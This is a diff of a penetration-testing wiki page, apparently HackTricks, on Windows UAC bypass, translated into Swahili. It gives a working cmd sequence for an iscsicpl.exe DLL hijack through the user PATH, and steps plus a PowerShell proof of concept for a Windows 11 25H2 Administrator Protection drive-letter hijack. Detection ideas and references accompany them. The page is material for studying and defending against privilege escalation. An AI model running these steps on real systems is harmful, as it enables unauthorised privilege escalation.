+Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayot **ekelezwa** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).
 
 ### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack
 
-32-bit `C:\Windows\SysWOW64\iscsicpl.exe` ni binary ya **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kwa search order. Kama unaweza kuweka `iscsiexe.dll` yenye malicious ndani ya folder inayoweza kuandikwa na **user** kisha ukabadilisha current user `PATH` (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya mchakato uliyo-elevated wa `iscsicpl.exe` **bila kuonyesha UAC prompt**.
+32-bit `C:\Windows\SysWOW64\iscsicpl.exe` ni binary **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kulingana na search order. Ikiwa unaweza kuweka `iscsiexe.dll` yenye madhara ndani ya folder inayoweza kuandikwa na **user**, kisha urekebishe `PATH` ya current user (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya process ya `iscsicpl.exe` iliyo elevated **bila kuonyesha UAC prompt**.
 
-Practical notes:
-- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha kwa **Medium Integrity** kutokana na UAC.
-- Nakala ya **SysWOW64** ndiyo muhimu kwa bypass hii. Chukulia nakala ya **System32** kama binary tofauti na thibitisha behavior yake kivyake.
-- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, hivyo workflow ile ile ya ProcMon inayotumiwa kwa UAC bypasses nyingine ni muhimu kuthibitisha upakiaji wa DLL inayokosekana.
+Mambo ya kuzingatia:
+- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha katika **Medium Integrity** kwa sababu ya UAC.
+- Nakala ya **SysWOW64** ndiyo inayohusika na bypass hii. Ichukulie nakala ya **System32** kama binary tofauti na uthibitishe tabia yake kivyake.
+- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hivyo workflow ileile ya ProcMon inayotumiwa kwa UAC bypasses nyingine ni muhimu kuthibitisha missing DLL load.
 
 Minimal flow:
 ```cmd
@@ -253,20 +296,34 @@ copy iscsiexe.dll %TEMP%\iscsiexe.dll
 reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
 C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
 ```
-Detection ideas:
-- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
-- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
-- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.
+Mawazo ya Detection:
+- Toa alert kwenye `reg add` / registry writes kwenda `HKCU\Environment\Path` yanayofuatwa mara moja na execution ya `C:\Windows\SysWOW64\iscsicpl.exe`.
+- Tafuta `iscsiexe.dll` katika maeneo yanayodhibitiwa na **user**, kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
+- Correlate launches za `iscsicpl.exe` na child processes zisizotarajiwa au DLL loads kutoka nje ya directories za kawaida za Windows.
 
-### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map
+### Utafiti mpya unaostahili kuchunguzwa kando
 
-Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.
+Baadhi ya chains za baada ya 2024 hazifanani tena na classic `HKCU\Software\Classes` registry hijacks. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kupanda kutoka medium hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe`, na baadaye targets kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia compact payload examples katika:
 
-**Steps:**
+{{#ref}}
+../windows-local-privilege-escalation/windows-c-payloads.md
+{{#endref}}
 
-1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
-2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
-3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.
+### Administrator Protection (25H2) drive-letter hijack kupitia per-logon-session DOS device map
+
+Kwa attack surface kamili ya `RAiLaunchAdminProcess` / UIAccess kwenye Windows 11 25H2, angalia ukurasa maalum:
+
+{{#ref}}
+../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
+{{#endref}}
+
+Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zenye per-session `\Sessions\0\DosDevices/<LUID>` maps. Directory huundwa lazily na `SeGetTokenDeviceMap` wakati wa resolution ya kwanza ya `\??`. Ikiwa attacker ana-impersonate shadow-admin token katika **SecurityIdentification** pekee, directory huundwa huku attacker akiwa **owner** (inarithi `CREATOR OWNER`), hivyo kuruhusu drive-letter links zinazotangulia `\GLOBAL??`.
+
+**Hatua:**
+
+1. Kutoka kwenye low-privileged session, ita `RAiProcessRunOnce` ili ku-spawn promptless shadow-admin `runonce.exe`.
+2. Duplicate primary token yake kuwa **identification** token na u-impersonate token hiyo unapofungua `\??` ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya ownership ya attacker.
+3. Unda `C:` symlink hapo inayoelekeza kwenye attacker-controlled storage; filesystem accesses zinazofuata katika session hiyo zita-resolve `C:` kwenda kwenye attacker path, hivyo kuwezesha DLL/file hijack bila prompt.
 
 **PowerShell PoC (NtObjectManager):**
 ```powershell
@@ -279,13 +336,14 @@ $auth = Get-NtTokenId -Authentication -Token $id
 New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
 ```
 ## Marejeo
-- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
-- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
 - [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
-- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
-- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
-- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
-- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
-- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
+- [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
+- [Checkpoint Research – KONNI Inatumia AI Kuzalisha PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
+- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Dhidi ya Malengo ya Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
+- [Project Zero – Kubypass Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
+- [Project Zero – Kubypass Administrator Protection kwa Kutumia UI Access Vibaya](https://projectzero.google/2026/02/windows-administrator-protection.html)
+- [Sigma / Detection.FYI – Bypass UAC kwa Kutumia SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
 
 {{#include ../../banners/hacktricks-training.md}}
